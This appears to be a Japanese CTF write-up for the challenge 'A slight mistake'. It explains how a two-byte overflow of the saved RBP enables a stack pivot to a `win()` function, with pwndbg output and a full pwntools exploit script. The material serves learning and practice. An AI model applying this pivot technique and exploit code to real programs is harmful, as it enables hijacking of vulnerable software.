# A slight mistake

## / Overview

**Stack pivot**

`chall.c` の中で明らかな脆弱性は、`greet`関数で使われている配列`name`への書き込みです。

`char name[64]`としてスタックに領域を確保しているのにも関わらず、書き込みは`read(0, name, 66)`となっているため2バイト分だけオーバーフローを起こしています。

## / Writeup

### 準備

このオーバーフローを悪用したいので、`read()`の前後でスタックがどの様に変化するのかを見てみます。検証には pwndbg を用いています。

まずは`greet()`の逆アセンブル結果から`read()`のアドレスを特定し、ブレークポイントを張ります。

```
pwndbg> disas greet
Dump of assembler code for function greet:
   # --snip--
   0x000000000040124c <+32>:    lea    rax,[rbp-0x40]
   0x0000000000401250 <+36>:    mov    edx,0x42
   0x0000000000401255 <+41>:    mov    rsi,rax
   0x0000000000401258 <+44>:    mov    edi,0x0
   0x000000000040125d <+49>:    call   0x4010b0 <read@plt>
   # --snip--
   0x0000000000401269 <+61>:    call   0x4011da <remove_newline>
   # --snip--
   0x000000000040128a <+94>:    leave
   0x000000000040128b <+95>:    ret
End of assembler dump.
pwndbg> b *0x000000000040125d
```

ブレークポイントまで実行を進めてスタックを表示します。

```
pwndbg> run
pwndbg> telescope 10
00:0000│ rax rsi rsp 0x7fffffffdcb0 ◂— 0xba00000006
01:0008│-038         0x7fffffffdcb8 ◂— 0
... ↓                4 skipped
06:0030│-010         0x7fffffffdce0 —▸ 0x7fffffffde38 —▸ 0x7fffffffe0cd ◂— '/home/wsl1/ctf/a-slight-mistake/chall'
07:0038│-008         0x7fffffffdce8 —▸ 0x7ffff7ffe2e0 ◂— 0
08:0040│ rbp         0x7fffffffdcf0 —▸ 0x7fffffffdd10 —▸ 0x7fffffffddb0 —▸ 0x7fffffffde10 ◂— 0
09:0048│+008         0x7fffffffdcf8 —▸ 0x4012d4 (main+72) ◂— mov eax, 0
```

pwndbg では `telescope <num>` でnum行分のスタックの内容を表示でき、親切に rbp や rsp がどこを指しているのか表示してくれます。

さらに直後の`remove_newline()`にブレークポイントを張った後に、`A`を66個入力し、スタックの状態の変化を見ます。

```
pwndbg> b *0x0000000000401269
pwndbg> c
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
pwndbg> telescope 10
00:0000│ rsi rsp 0x7fffffffdcb0 ◂— 0x4141414141414141 ('AAAAAAAA')
... ↓            7 skipped
08:0040│ rbp     0x7fffffffdcf0 —▸ 0x7fffffff4141 ◂— 0
09:0048│+008     0x7fffffffdcf8 —▸ 0x4012d4 (main+72) ◂— mov eax, 0
```

先程の結果と見比べると、 [rbp-0x40] から64バイト分が`A`で埋め尽くされ、オーバーフローした2バイトは Saved RBP の下位桁に影響しています。私たちが悪用できるのはこの下位2バイトです。

> [!TIP]
> telescopeのskipped表示は繰り返されるバイトを非表示にします。この機能を無効にしたい場合は
> `set telescope-skip-repeating-val off`
> で設定できます。

### Stack Pivot について

Saved RBP を書き換えられる場合、**Stack Pivot**という手法が有効です。攻撃が成り立つ原理は関数終了時に呼び出される`leave`と`ret`によって説明できます。

まず`leave`は2つの命令を1つにまとめたもので、展開すると
```
mov rsp, rbp
pop rbp
```
になります。例えば`greet()`の終了時に`leave`呼び出されると、rbp の値が Saved RBP の値に置き換わります。本来であれば Saved RBP には、呼び出し元である`main()`の rbp が入っているので、`greet()`を呼び出す前と後で`main()`は同じ rbp を使えるという仕組みです。

次に`ret`が呼び出されると Saved RBP の一つ下(+8バイト)に書かれているアドレスを次の rip として実行します。先程の telescope の結果を振り返ると`main+72`が入っていますので、次はこの位置から命令が実行されます。

では Saved RBP を好きな値 (ここでは fake RBP と呼ぶ) に書き換えられる時、何が起こるでしょうか。

関数が終了すると rbp は fake RBP を指すようになります。もし呼び出し元である `main()` が rbp を用いた命令を実行する場合、この fake RBP を基準に計算するようになります。

さらに `main()` の終了時には、`leave; ret`が行われると同時に fake RBP の値は`main()`呼び出し元の関数の rbp として解釈されるため、

* `rbp = (アドレス fake RBP の値)`
* `rip = (アドレス fake RBP + 8 の値)`

が代入されます。

分かりやすいように具体例で見ます。攻撃者が次のようなデータをメモリ上の何処かに書き込み、その先頭を fake RBP として Saved RBP を書き換えた場合のシミュレーションを見て見ましょう。

```
メモリ上の何処か
+----------------------+
|       AAAAAAAA       | <- ここのアドレスを fake RBP にする
+----------------------+
|    実行させたい命令    |
+----------------------+
```

`greet()`を抜け、`main()`を終了した時、

* `rbp = AAAAAAAA`
* `rip = 実行させたい命令`

が代入されるため、攻撃者は任意の命令を実行させることができます。

では書き込み先のメモリ領域はどこかと言うと、グローバル配列に書き込めるなら`.bss`領域、ローカル配列に書き込めるならスタックであることが多いです。

### 解く

ではチャレンジに戻りましょう。Saved RBPは現在`main+72`のアドレスを値として持っているスタック上のアドレス(0x7fffffffdd10)を指しているので、下位2バイトしか書き換えられない状況ではスタック領域に Stack Pivot 用のデータを配置するしかありません。

また、我々が書き込みを行えるのは`name`配列だけなので、これの先頭データを

```
+----------------------+
|       AAAAAAAA       | <- nameの先頭
+----------------------+
|    win()のアドレス    |
+----------------------+
```

にしてみましょう。さらに配列の末尾では Saved RBP の書き換えを行うことで、自身の先頭に rip を持ってきたいので`name`のアドレスを知る必要がありますが、No PIEかつASLR有効なのでスタック内での変数間のオフセットは一定です。スタック上の変数`alpaca`のアドレスが漏洩しているので`name - alpaca`のオフセットを足すことで、真の `name` のアドレスを得ることができます。

得られた`name`のアドレスは (0x7fffffffdd10) から2バイト以上離れていないはずなので下位バイトの書き換えだけで`name`の先頭に rip を仕向けることができます。実際ASLRがない環境での`name`のアドレスは (0x7fffffffdcb0) なので2バイトの書き換えで済みます。

これまでの説明を踏まえてペイロードを完成させます。実際の下位2バイトの値は動的に得られる`name`の下位2バイトに変更してください。

```
+----------------------+
|       AAAAAAAA       | <- nameの先頭 (0x7fffffffdcb0)
+----------------------+
|    win()のアドレス    |
+----------------------+
|       AAAAAAAA       |
|       AAAAAAAA       |
|       AAAAAAAA       |
|       AAAAAAAA       |
|       AAAAAAAA       |
|       AAAAAAAA       | <- name+64 
+----------------------+
| \xb0\xdc | <- nameの下位2バイト
+----------+
```

## / Solver

```py
from pwn import *

elf = ELF('./chall')
win_addr = elf.symbols['win']

p = process('./chall')
# p = remote('34.170.146.252', 23138)

p.recvuntil(b'[leaked] address of `alpaca`:')
alpaca_addr = int(p.recvline().strip(), 16)
offset = 0x7fffffffdcb0 - 0x7fffffffdd00
name_addr = alpaca_addr + offset

payload = b'A'*8
payload += p64(win_addr)
payload += b'A'*0x30
payload += p64(name_addr)[:2]

p.recvuntil(b'your name>')
p.send(payload)

p.interactive()
```